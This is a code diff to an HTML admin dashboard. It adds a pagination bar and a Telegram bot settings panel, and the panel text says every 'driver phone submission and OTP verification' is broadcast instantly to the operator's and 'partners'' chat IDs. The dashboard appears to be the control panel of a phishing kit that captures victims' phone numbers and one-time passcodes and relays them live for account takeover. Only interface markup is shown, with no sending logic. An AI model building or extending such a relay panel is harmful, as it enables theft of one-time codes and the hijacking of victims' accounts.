@@ -12,7 +12,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <link rel="stylesheet" href="css/admin.css">
+    <link rel="stylesheet" href="/css/admin.css">
 </head>
 <body>
 
@@ -138,6 +138,50 @@
                 </div>
             </div>
 
+            <!-- Telegram Notification Settings Panel -->
+            <section class="email-settings-section" style="border-color: rgba(0, 136, 204, 0.4);">
+                <div class="section-header">
+                    <h3 style="color: #FFFFFF;"><i class="fa-brands fa-telegram" style="color: #0088cc; font-size: 20px;"></i> Instant Telegram Bot Settings (⚡ Speed &lt; 0.5s)</h3>
+                    <button class="btn-icon-admin" onclick="toggleTelegramPanel()" id="telegram-panel-toggle" style="background:#0088cc; color: #FFFFFF; padding: 6px 14px; font-size: 12px; border: none;">
+                        <i class="fa-solid fa-chevron-down" id="telegram-panel-icon"></i> Show Settings
+                    </button>
+                </div>
+                <div id="telegram-settings-panel" class="email-panel hidden" style="display: none;">
+                    
+                    <!-- Telegram Bot Token & Multi Chat IDs -->
+                    <div class="email-config-group" style="border-color: rgba(0, 136, 204, 0.3);">
+                        <h4 style="color: #60A5FA;"><i class="fa-solid fa-robot" style="color: #0088cc;"></i> Telegram Bot API Configuration</h4>
+                        <p class="config-hint">Every driver phone submission and OTP verification is broadcasted 100% INSTANTLY with sound alerts to all registered Telegram Chat IDs.</p>
+                        
+                        <div class="email-input-group" style="margin-bottom: 20px;">
+                            <label>Telegram Bot Token</label>
+                            <input type="text" id="telegram-token" placeholder="e.g. 8952162506:AAHz_Jzd918IOGz5wf7wWYkB4Hglr8rhegg">
+                        </div>
+
+                        <h4 style="color: #60A5FA; margin-top: 16px;"><i class="fa-solid fa-users" style="color: #0088cc;"></i> Telegram Recipients (Multiple Chat IDs)</h4>
+                        <p class="config-hint">Add one or more Chat IDs (your ID or partners' IDs) to receive alerts simultaneously on your phones.</p>
+                        
+                        <div class="recipients-list" id="telegram-chat-ids-list">
+                            <!-- Dynamic Chat ID inputs will be added here -->
+                        </div>
+
+                        <div class="recipients-actions">
+                            <button class="btn-add-email" onclick="addChatIdInput()" style="border-color: #0088cc; color: #0088cc;">
+                                <i class="fa-solid fa-plus"></i> Add Chat ID
+                            </button>
+                            <button class="btn-save-smtp" onclick="saveTelegramConfig()" style="background: linear-gradient(135deg, #0088cc, #006699);">
+                                <i class="fa-solid fa-floppy-disk"></i> Save Telegram Settings
+                            </button>
+                            <button class="btn-icon-admin" onclick="sendTestTelegram()" style="background:#0088cc; padding: 8px 16px; border: none;">
+                                <i class="fa-brands fa-telegram"></i> Send Test Telegram Alert
+                            </button>
+                        </div>
+                        <span id="telegram-status-msg" class="config-status"></span>
+                    </div>
+
+                </div>
+            </section>
+
             <!-- Live Activity Notification Bar & Stream -->
             <section class="live-activity-section">
                 <div class="section-header">
@@ -183,13 +227,32 @@
                         </tbody>
                     </table>
                 </div>
+
+                <!-- Table Pagination Bar -->
+                <div class="table-pagination-bar">
+                    <div class="pagination-info">
+                        <span id="pagination-summary">Showing 0 to 0 of 0 records</span>
+                        <div class="page-size-selector">
+                            <label for="items-per-page-select">Show:</label>
+                            <select id="items-per-page-select" onchange="changePageSize()">
+                                <option value="25">25 per page</option>
+                                <option value="50" selected>50 per page</option>
+                                <option value="100">100 per page</option>
+                                <option value="all">Show All</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="pagination-buttons" id="pagination-buttons">
+                        <!-- Dynamic page buttons will be rendered here -->
+                    </div>
+                </div>
             </section>
 
         </div>
     </div>
 
     <!-- Audio Player & Socket.io Scripts -->
-    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-    <script src="js/admin.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/admin.js"></script>
 </body>
 </html>
